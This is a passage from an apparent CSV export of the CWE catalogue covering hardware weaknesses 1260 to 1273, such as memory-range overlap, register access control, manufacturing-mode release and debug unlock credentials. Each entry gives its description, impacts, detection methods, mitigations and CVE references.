on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Files or Directories:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Modify Memory:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Security Token assignment review checks for design inconsistency and common weaknesses. Security-Token definition and programming flow is tested in both pre-silicon and post-silicon testing.::\",\"\",,,\"\",::121::681::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements. Currently it is expressed as a general absence of a protection mechanism as opposed to a specific mistake, and the entry's name and description could be interpreted as applying to software.::\",\n1260,\"Improper Handling of Overlap Between Protected Memory Ranges\",Base,Stable,\"The product allows address regions to overlap, which can result in the bypassing of intended memory protection.\",\"Isolated memory regions and access control (read/write) policies are used by hardware to protect privileged software. Software components are often allowed to change or remap memory region definitions in order to enable flexible and dynamically changeable memory management by system software. If a software component running at lower privilege can program a memory address region to overlap with other memory regions used by software running at higher privilege, privilege escalation may be available to attackers. The memory protection unit (MPU) logic can incorrectly handle such an address overlap and allow the lower-privilege software to read or write into the protected memory region, resulting in privilege escalation attack. An address overlap weakness can also be used to launch a denial of service attack on the higher-privilege software memory regions.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design or implementation and identified later during the Testing phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Instability:LIKELIHOOD:High::\",\"::METHOD:Manual Analysis:DESCRIPTION:Create a high privilege memory block of any arbitrary size. Attempt to create a lower privilege memory block with an overlap of the high privilege memory block. If the creation attempt works, fix the hardware. Repeat the test.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that memory regions are isolated as intended and that access control (read/write) policies are used by hardware to protect privileged software.::PHASE:Implementation:DESCRIPTION:For all of the programmable memory protection regions, the memory protection unit (MPU) design can define a priority scheme. For example: if three memory regions can be programmed (Region_0, Region_1, and Region_2), the design can enforce a priority scheme, such that, if a system address is within multiple regions, then the region with the lowest ID takes priority and the access-control policy of that region will be applied. In some MPU designs, the priority scheme can also be programmed by trusted software. Hardware logic or trusted firmware can also check for region definitions and block programming of memory regions with overlapping addresses. The memory-access-control-check filter can also be designed to apply a policy filter to all of the overlapping ranges, i.e., if an address is within Region_0 and Region_1, then access to this address is only granted if both Region_0 and Region_1 policies allow the access.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2008-7096:DESCRIPTION:virtualization product allows compromise of hardware product by accessing certain remapping registers.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-7096::REFERENCE:[REF-1100]:DESCRIPTION:processor design flaw allows ring 0 code to access more privileged rings by causing a register window to overlap a range of protected system RAM [REF-1100]:LINK:https://github.com/xoreaxeaxeax/sinkhole/blob/master/us-15-Domas-TheMemorySinkhole-wp.pdf::\",,,\"\",::456::679::,\"::TYPE:Maintenance:NOTE:As of CWE 4.6, CWE-1260 and CWE-1316 are siblings under view 1000, but CWE-1260 might be a parent of CWE-1316. More analysis is warranted.::\",\n1261,\"Improper Handling of Single Event Upsets\",Base,Draft,\"The hardware logic does not effectively handle when single-event upsets (SEUs) occur.\",\"Technology trends such as CMOS-transistor down-sizing, use of new materials, and system-on-chip architectures continue to increase the sensitivity of systems to soft errors. These errors are random, and their causes might be internal (e.g., interconnect coupling) or external (e.g., cosmic radiation). These soft errors are not permanent in nature and cause temporary bit flips known as single-event upsets (SEUs). SEUs are induced errors in circuits caused when charged particles lose energy by ionizing the medium through which they pass, leaving behind a wake of electron-hole pairs that cause temporary failures. If these failures occur in security-sensitive modules in a chip, it might compromise the security guarantees of the chip. For instance, these temporary failures could be bit flips that change the privilege of a regular user to root.\",::NATURE:ChildOf:CWE ID:1384:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1254:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Access Control:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Instability:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Implement triple-modular redundancy around security-sensitive modules.::PHASE:Architecture and Design:DESCRIPTION:SEUs mostly affect SRAMs. For SRAMs storing security-critical data, implement Error-Correcting-Codes (ECC) and Address Interleaving.::\",\"\",,,\"\",,\"\",\n1262,\"Improper Access Control for Register Interface\",Base,Stable,\"The product uses memory-mapped I/O registers that act as an interface to hardware functionality from software, but there is improper access control to those registers.\",\"Software commonly accesses peripherals in a System-on-Chip (SoC) or other device through a memory-mapped register interface. Malicious software could tamper with any security-critical hardware data that is accessible directly or indirectly through the register interface, which could lead to a loss of confidentiality and integrity.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness may be exploited if the register interface design does not adequately protect hardware assets from software.::PHASE:Implementation:NOTE:Mis-implementation of access control policies may inadvertently allow access to hardware assets through the register interface.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Memory:IMPACT:Read Application Data:IMPACT:Modify Memory:IMPACT:Modify Application Data:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Unexpected State:IMPACT:Alter Execution Logic:NOTE:Confidentiality of hardware assets may be violated if the protected information can be read out by software through the register interface. Registers storing security state, settings, other security-critical data may be corruptible by software without correctly implemented protections.::\",\"::METHOD:Manual Analysis:DESCRIPTION:This is applicable in the Architecture phase before implementation started. Make sure access policy is specified for the entire memory map. Manual analysis may not ensure the implementation is correct.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Registers controlling hardware should have access control implemented. This access control may be checked manually for correct implementation. Items to check consist of how are trusted parties set, how are trusted parties verified, how are accesses verified, etc. Effectiveness of a manual analysis will vary depending upon how complicated the interface is constructed.:EFFECTIVENESS:Moderate::METHOD:Simulation / Emulation:DESCRIPTION:Functional simulation is applicable during the Implementation Phase. Testcases must be created and executed for memory mapped registers to verify adherence to the access control policy. This method can be effective, since functional verification needs to be performed on the design, and verification for this weakness will be included. There can be difficulty covering the entire memory space during the test.:EFFECTIVENESS:Moderate::METHOD:Formal Verification:DESCRIPTION:Formal verification is applicable during the Implementation phase. Assertions need to be created in order to capture illegal register access scenarios and prove that they cannot occur. Formal methods are exhaustive and can be very effective, but creating the cases for large designs may be complex and difficult.:EFFECTIVENESS:High::METHOD:Automated Analysis:DESCRIPTION:Information flow tracking can be applicable during the Implementation phase. Security sensitive data (assets) - for example, as stored in registers - is automatically tracked over time through the design to verify the data doesn't reach illegal destinations that violate the access policies for the memory map. This method can be very effective when used together with simulation and emulation, since detecting violations doesn't rely on specific scenarios or data values. This method does rely on simulation and emulation, so testcases must exist in order to use this method.:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:Manual documentation review of the system memory map, register specification, and permissions associated with accessing security-relevant functionality exposed via memory-mapped registers.:EFFECTIVENESS:Moderate::METHOD:Fuzzing:DESCRIPTION:Perform penetration testing (either manual or semi-automated with fuzzing) to verify that access control mechanisms such as the memory protection units or on-chip bus firewall settings adequately protect critical hardware registers from software access.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:Design proper policies for hardware register access from software.::PHASE:Implementation:DESCRIPTION:Ensure that access control policies for register access are implemented in accordance with the specified design.::\",\"::REFERENCE:CVE-2014-2915:DESCRIPTION:virtualization product does not restrict access to debug and other processor registers in the hardware, allowing a crash of the host or guest OS:LINK:https://www.cve.org/CVERecord?id=CVE-2014-2915::REFERENCE:CVE-2021-3011:DESCRIPTION:virtual interrupt controller in a virtualization product allows crash of host by writing a certain invalid value to a register, which triggers a fatal error instead of returning an error code:LINK:https://www.cve.org/CVERecord?id=CVE-2021-3011::REFERENCE:CVE-2020-12446:DESCRIPTION:Driver exposes access to Model Specific Register (MSR) registers, allowing admin privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12446::REFERENCE:CVE-2015-2150:DESCRIPTION:Virtualization product does not restrict access to PCI command registers, allowing host crash from the guest.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-2150::\",,,\"\",::680::,\"\",\n1263,\"Improper Physical Access Control\",Class,Incomplete,\"The product is designed with access restricted to certain information, but it does not sufficiently protect against an unauthorized actor with physical access to these areas.\",\"Sections of a product intended to have restricted access may be inadvertently or intentionally rendered accessible when the implemented physical protections are insufficient. The specific requirements around how robust the design of the physical protection mechanism needs to be depends on the type of product being protected. Selecting the correct physical protection mechanism and properly enforcing it through implementation and manufacturing are critical to the overall physical security of the product.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1191:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can arise if design decisions are made that do not align with the intended physical protection of the product::PHASE:Manufacturing:NOTE:While the architecture and design phase of the product may have accurately met the intended robustness for product physical protections, this phase may introduce the weakness through errors in physically manufacturing the product.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Varies by Context::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Specific protection requirements depend strongly on contextual factors including the level of acceptable risk associated with compromise to the product's protection mechanism. Designers could incorporate anti-tampering measures that protect against or detect when the product has been tampered with.::PHASE:Testing:DESCRIPTION:The testing phase of the lifecycle should establish a method for determining whether the protection mechanism is sufficient to prevent unauthorized access.::PHASE:Manufacturing:DESCRIPTION:Ensure that all protection mechanisms are fully activated at the time of manufacturing and distribution.::\",\"\",,,\"\",::401::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1264,\"Hardware Logic with Insecure De-Synchronization between Control and Data Channels\",Base,Incomplete,\"The hardware logic for error handling and security checks can incorrectly forward data before the security check is complete.\",\"Many high-performance on-chip bus protocols and processor data-paths employ separate channels for control and data to increase parallelism and maximize throughput. Bugs in the hardware logic that handle errors and security checks can make it possible for data to be forwarded before the completion of the security checks. If the data can propagate to a location in the hardware observable to an attacker, loss of data confidentiality can occur. 'Meltdown' is a concrete example of how de-synchronization between data and permissions checking logic can violate confidentiality requirements. Data loaded from a page marked as privileged was returned to the cpu regardless of current privilege level for performance reasons. The assumption was that the cpu could later remove all traces of this data during the handling of the illegal memory access exception, but this assumption was proven false as traces of the secret data were not removed from the microarchitectural state.\",::NATURE:ChildOf:CWE ID:821:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1037:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:The weakness can be introduced in the data transfer or bus protocol itself or in the implementation.::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Thoroughly verify the data routing logic to ensure that any error handling or security checks effectively block illegal dataflows.::\",\"::REFERENCE:CVE-2017-5754:DESCRIPTION:Systems with microprocessors utilizing speculative execution and indirect branch prediction may allow unauthorized disclosure of information to an attacker with local user access via a side-channel analysis of the data cache.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5754::\",,,\"\",::233::663::,\"::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. As a result, this entry might change significantly in CWE 4.10.::\",\n1266,\"Improper Scrubbing of Sensitive Data from Decommissioned Device\",Base,Incomplete,\"The product does not properly provide a capability for the product administrator to remove sensitive data at the time the product is decommissioned. A scrubbing capability could be missing, insufficient, or incorrect.\",\"When a product is decommissioned - i.e., taken out of service - best practices or regulatory requirements may require the administrator to remove or overwrite sensitive data first, i.e. scrubbing. Improper scrubbing of sensitive data from a decommissioned device leaves that data vulnerable to acquisition by a malicious actor. Sensitive data may include, but is not limited to, device/manufacturer proprietary information, user/device credentials, network configurations, and other forms of sensitive data.\",::NATURE:ChildOf:CWE ID:404:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Policy::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Functionality to completely scrub data from a product at the conclusion of its lifecycle should be part of the design phase. Trying to add this function on top of an existing architecture could lead to incomplete removal of sensitive information/data.::PHASE:Policy:DESCRIPTION:The manufacturer should describe the location(s) where sensitive data is stored and the policies and procedures for its removal. This information may be conveyed, for example, in an Administrators Guide or a Statement of Volatility.::PHASE:Implementation:DESCRIPTION:If the capability to wipe sensitive data isn't built-in, the manufacturer may need to provide a utility to scrub sensitive data from storage if that data is located in a place which is non-accessible by the administrator. One example of this could be when sensitive data is stored on an EEPROM for which there is no user/admin interface provided by the system.::\",\"\",,,\"\",::150::37::545::546::675::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1267,\"Policy Uses Obsolete Encoding\",Base,Draft,\"The product uses an obsolete encoding mechanism to implement access controls.\",\"Within a System-On-a-Chip (SoC), various circuits and hardware engines generate transactions for the purpose of accessing (read/write) assets or performing various actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (identifying the originator of the transaction) and a destination identity (routing the transaction to the respective entity). Sometimes the transactions are qualified with a Security Token. This Security Token helps the destination agent decide on the set of allowed actions (e.g., access to an asset for reads and writes). A policy encoder is used to map the bus transactions to Security Tokens that in turn are used as access-controls/protection mechanisms. A common weakness involves using an encoding which is no longer trusted, i.e., an obsolete encoding.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Modify Files or Directories:IMPACT:Read Files or Directories:IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Reduce Reliability:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Security Token Decoders should be reviewed for design inconsistency and common weaknesses. Access and programming flows should be tested in both pre-silicon and post-silicon testing.:EFFECTIVENESS:High::\",\"\",,,\"\",::121::681::,\"\",\n1268,\"Policy Privileges are not Assigned Consistently Between Control and Data Agents\",Base,Draft,\"The product's hardware-enforced access control for a particular resource improperly accounts for privilege discrepancies between control and write policies.\",\"Integrated circuits and hardware engines may provide access to resources (device-configuration, encryption keys, etc.) belonging to trusted firmware or software modules (commonly set by a BIOS or a bootloader). These accesses are typically controlled and limited by the hardware. Hardware design access control is sometimes implemented using a policy. A policy defines which entity or agent may or may not be allowed to perform an action. When a system implements multiple levels of policies, a control policy may allow direct access to a resource as well as changes to the policies themselves. Resources that include agents in their control policy but not in their write policy could unintentionally allow an untrusted agent to insert itself in the write policy register. Inclusion in the write policy register could allow a malicious or misbehaving agent write access to resources. This action could result in security compromises including leaked information, leaked encryption keys, or modification of device configuration.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness may be introduced during the design of a device when the architect does not comprehensively specify all of the policies required by an agent.::PHASE:Implementation:NOTE:This weakness may be introduced during implementation if device policy restrictions do not sufficiently constrain less-privileged clients.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Read Files or Directories:IMPACT:Reduce Reliability:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Access-control-policy definition and programming flow must be sufficiently tested in pre-silicon and post-silicon testing.::\",\"\",,,\"\",::180::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1269,\"Product Released in Non-Release Configuration\",Base,Incomplete,\"The product released to market is released in pre-production or manufacturing configuration.\",\"Products in the pre-production or manufacturing stages are configured to have many debug hooks and debug capabilities, including but not limited to: Ability to override/bypass various cryptographic checks (including authentication, authorization, and integrity) Ability to read/write/modify/dump internal state (including registers and memory) Ability to change system configurations Ability to run hidden or private commands that are not allowed during production (as they expose IP). The above is by no means an exhaustive list, but it alludes to the greater capability and the greater state of vulnerability of a product during it's preproduction or manufacturing state. Complexity increases when multiple parties are involved in executing the tests before the final production version. For example, a chipmaker might fabricate a chip and run its own preproduction tests, following which the chip would be delivered to the Original Equipment Manufacturer (OEM), who would now run a second set of different preproduction tests on the same chip. Only after both of these sets of activities are complete, can the overall manufacturing phase be called complete and have the Manufacturing Complete fuse blown. However, if the OEM forgets to blow the Manufacturing Complete fuse, then the system remains in the manufacturing stage, rendering the system both exposed and vulnerable.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Compiled:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Other:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Integration::PHASE:Manufacturing::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Other:LIKELIHOOD:High::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Ensure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete stage (i.e., the Manufacturing Complete fuse gets blown).::PHASE:Integration:DESCRIPTION:Ensure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete stage (i.e., the Manufacturing Complete fuse gets blown).::PHASE:Manufacturing:DESCRIPTION:Ensure that there exists a marker for denoting the Manufacturing Complete stage and that the Manufacturing Complete marker gets updated at the Manufacturing Complete stage (i.e., the Manufacturing Complete fuse gets blown).::\",\"::REFERENCE:CVE-2019-13945:DESCRIPTION:Regarding SSA-686531, a hardware based manufacturing access on S7-1200 and S7-200 SMART has occurred. A vulnerability has been identified in SIMATIC S7-1200 CPU family (incl. SIPLUS variants) (All versions), SIMATIC S7-200 SMART CPU family (All versions). There is an access mode used during manufacturing of S7-1200 CPUs that allows additional diagnostic functionality. The security vulnerability could be exploited by an attacker with physical access to the UART interface during boot process. At the time of advisory publication, no public exploitation of this security vulnerability was known.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-13945::REFERENCE:CVE-2018-4251:DESCRIPTION:Laptops with Intel chipsets were found to be running in Manufacturing Mode. After this information was reported to the OEM, the vulnerability (CVE-2018-4251) was patched disallowing access to the interface.:LINK:https://www.cve.org/CVERecord?id=CVE-2018-4251::\",,,\"\",::439::,\"\",\n1270,\"Generation of Incorrect Security Tokens\",Base,Incomplete,\"The product implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens generated in the system are incorrect.\",\"Systems-On-a-Chip (SoC) (Integrated circuits and hardware engines) implement Security Tokens to differentiate and identify actions originated from various agents. These actions could be read, write, program, reset, fetch, compute, etc. Security Tokens are generated and assigned to every agent on the SoC that is either capable of generating an action or receiving an action from another agent. Every agent could be assigned a unique, Security Token based on its trust level or privileges. Incorrectly generated Security Tokens could result in the same token used for multiple agents or multiple tokens being used for the same agent. This condition could result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1294:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Files or Directories:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Generation of Security Tokens should be reviewed for design inconsistency and common weaknesses. Security-Token definition and programming flow should be tested in pre-silicon and post-silicon testing.::\",\"\",,,\"\",::121::633::681::,\"\",\n1271,\"Uninitialized Value on Reset for Registers Holding Security Settings\",Base,Incomplete,\"Security-critical logic is not set to a known value on reset.\",\"When the device is first brought out of reset, the state of registers will be indeterminate if they have not been initialized by the logic. Before the registers are initialized, there will be a window during which the device is in an insecure state and may be vulnerable to attack.\",::NATURE:ChildOf:CWE ID:909:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Authentication:SCOPE:Authorization:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Design checks should be performed to identify any uninitialized flip-flops used for security-critical functions.::PHASE:Architecture and Design:DESCRIPTION:All registers holding security-critical information should be set to a specific value on reset.::\",\"\",,,\"\",::74::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1272,\"Sensitive Information Uncleared Before Debug/Power State Transition\",Base,Stable,\"The product performs a power or debug state transition, but it does not clear sensitive information that should no longer be accessible due to changes to information access restrictions.\",\"A device or system frequently employs many power and sleep states during its normal operation (e.g., normal power, additional power, low power, hibernate, deep sleep, etc.). A device also may be operating within a debug condition. State transitions can happen from one power or debug state to another. If there is information available in the previous state which should not be available in the next state and is not properly removed before the transition into the next state, sensitive information may leak from the system.\",::NATURE:ChildOf:CWE ID:226:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Hardware Description Language:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Read Memory:IMPACT:Read Application Data:LIKELIHOOD:High:NOTE:Sensitive information may be used to unlock additional capabilities of the device and take advantage of hidden functionalities which could be used to compromise device security.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Write a known pattern into each sensitive location. Enter the power/debug state in question. Read data back from the sensitive locations. If the reads are successful, and the data is the same as the pattern that was originally written, the test fails and the device needs to be fixed. Note that this test can likely be automated.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:During state transitions, information not needed in the next state should be removed before the transition to the next state.::\",\"::REFERENCE:CVE-2020-12926:DESCRIPTION:Product software does not set a flag as per TPM specifications, thereby preventing a failed authorization attempt from being recorded after a loss of power.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12926::\",::Power::,,\"\",::150::37::545::546::,\"\",\n1273,\"Device Unlock Credential Sharing\",Base,Incomplete,\"The credentials necessary for unlocking a device are shared across multiple parties and may expose sensitive information.\",\"Unlocking a device often means activating certain unadvertised debug and manufacturer-specific capabilities of a device using sensitive credentials. Unlocking a device might be necessary for the purpose of troubleshooting device problems. For example, suppose a device contains the ability to dump the content of the full system memory by disabling the memory-protection mechanisms. Since this is a highly security-sensitive capability, this capability is locked in the production part. Unless the device gets unlocked by supplying the proper credentials, the debug capabilities are not available. For cases where the chip designer, chip manufacturer (fabricator), and manufacturing and assembly testers are all employed by the same company, the risk of compromise of the credentials is greatly reduced. However, the risk is greater when the chip designer is employed by one company, the chip manufacturer is employed by another company (a foundry), and the assemblers and testers are 